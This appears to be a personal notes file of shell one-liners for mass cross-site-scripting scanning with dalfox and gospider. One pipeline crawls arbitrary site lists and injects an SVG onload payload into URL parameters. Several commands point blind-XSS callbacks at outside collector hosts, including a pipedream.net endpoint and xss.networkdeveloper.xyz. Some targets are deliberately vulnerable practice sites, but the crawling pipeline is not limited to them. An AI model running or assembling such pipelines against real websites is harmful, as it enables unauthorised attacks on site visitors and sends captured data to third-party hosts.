##mygf_dalfox.sh:dalfox file /tmp/testxss$$.txt -b tigv2.xss.ht pipe

##xss.sh:###| dalfox pipe | 
##xss.sh:gospider -S $listofsite |  tr " " "\n" | grep -v ".js" | grep "https://" | grep "=" | qsreplace '%22><svg%20onload=confirm(1);>' | dalfox pipe -b "https://eowtcfg85ren6ip.m.pipedream.net"

#dalfox url http://testphp.vulnweb.com/listproducts.php?artist=123 -b xss.networkdeveloper.xyz


##dalfox url https://sandbox.pwnfunction.com/warmups/mafia.html -b xss.networkdeveloper.xyz
#dalfox url "https://sandbox.pwnfunction.com/?html=&js=&css=" -b xss.networkdeveloper.xyz


###dalfox -url http://testphp.vulnweb.com/listproducts.php\?cat\=123\&artist\=123\&asdf\=ff

#$ dalfox -iL urls_file

##cat urls_file | dalfox -pipe
